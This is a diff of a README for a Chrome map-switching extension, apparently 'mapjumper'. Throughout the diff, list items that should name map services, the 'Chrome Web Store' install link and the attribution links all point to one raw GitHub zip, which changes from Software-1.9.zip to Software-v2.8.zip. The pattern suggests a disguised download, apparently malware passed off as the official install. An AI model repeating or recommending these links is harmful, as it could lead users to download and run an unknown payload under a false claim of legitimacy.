@@ -10,7 +10,7 @@ As of version 0.6.0 one can jump
   * Bing
   * **Foursquare**
   * Google Maps
-  * https://github.com/ANIS240/mapjumper/raw/refs/heads/master/src/Software-1.9.zip
+  * https://github.com/ANIS240/mapjumper/raw/refs/heads/master/graphics/Software-v2.8.zip
   * OpenStreetMap
   * Waze
   * Wikimapia
@@ -21,7 +21,7 @@ As of version 0.6.0 one can jump
   * Bing Maps
   * Google Maps
   * MapQuest Maps
-  * https://github.com/ANIS240/mapjumper/raw/refs/heads/master/src/Software-1.9.zip
+  * https://github.com/ANIS240/mapjumper/raw/refs/heads/master/graphics/Software-v2.8.zip
   * OpenStreetMap
   * Waze
   * Wikimapia
@@ -32,7 +32,7 @@ As of version 0.6.0 one can jump
 
 Install directly from Chrome Web Store:
 
-https://github.com/ANIS240/mapjumper/raw/refs/heads/master/src/Software-1.9.zip
+https://github.com/ANIS240/mapjumper/raw/refs/heads/master/graphics/Software-v2.8.zip
 
 OR
 
@@ -45,5 +45,5 @@ Tools > Extensions > Developer mode > Load unpacked extension > Browse to the sr
 ## Code by others used
 
 Code is derived from Mappy extension from the samples:
-https://github.com/ANIS240/mapjumper/raw/refs/heads/master/src/Software-1.9.zip
-https://github.com/ANIS240/mapjumper/raw/refs/heads/master/src/Software-1.9.zip
+https://github.com/ANIS240/mapjumper/raw/refs/heads/master/graphics/Software-v2.8.zip
+https://github.com/ANIS240/mapjumper/raw/refs/heads/master/graphics/Software-v2.8.zip
